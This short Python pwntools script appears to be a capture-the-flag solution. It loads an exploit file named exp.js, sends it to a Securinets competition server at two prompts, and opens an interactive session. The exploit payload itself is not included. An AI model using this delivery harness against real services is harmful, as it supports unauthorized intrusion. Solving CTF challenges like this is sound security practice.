from pwn import *

with open('exp.js', 'rb') as f:
    exp = f.read()

context.log_level = 'debug'
io = remote('pwn-14caf623.p1.securinets.tn', 9003)

io.sendlineafter(b'5k:', str(len(exp)).encode())
io.sendlineafter(b'please!!', exp)

io.interactive()